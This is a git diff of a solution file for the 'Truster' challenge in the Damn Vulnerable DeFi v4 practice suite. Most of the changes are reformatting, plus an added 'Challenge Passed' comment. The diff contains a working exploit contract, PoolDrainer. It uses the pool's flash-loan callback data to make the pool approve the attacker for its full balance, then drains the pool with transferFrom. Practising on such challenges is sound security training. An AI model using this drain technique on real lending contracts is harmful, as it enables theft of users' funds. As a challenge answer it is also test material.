@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+//Challenge Passed.
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
@@ -11,7 +12,11 @@ contract PoolDrainer {
     DamnValuableToken token;
     address recovery;
 
-    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+    constructor(
+        TrusterLenderPool _pool,
+        DamnValuableToken _token,
+        address _recovery
+    ) {
         token = _token;
         pool = _pool;
         recovery = _recovery;
@@ -19,9 +24,16 @@ contract PoolDrainer {
     }
 
     function flashLoanToRecovery() public {
-        bytes memory data = abi.encodeCall(token.approve, (address(this), token.balanceOf(address(pool))));
+        bytes memory data = abi.encodeCall(
+            token.approve,
+            (address(this), token.balanceOf(address(pool)))
+        );
         pool.flashLoan(0, address(this), address(token), data);
-        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+        token.transferFrom(
+            address(pool),
+            recovery,
+            token.balanceOf(address(pool))
+        );
     }
 }
 
@@ -82,6 +94,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
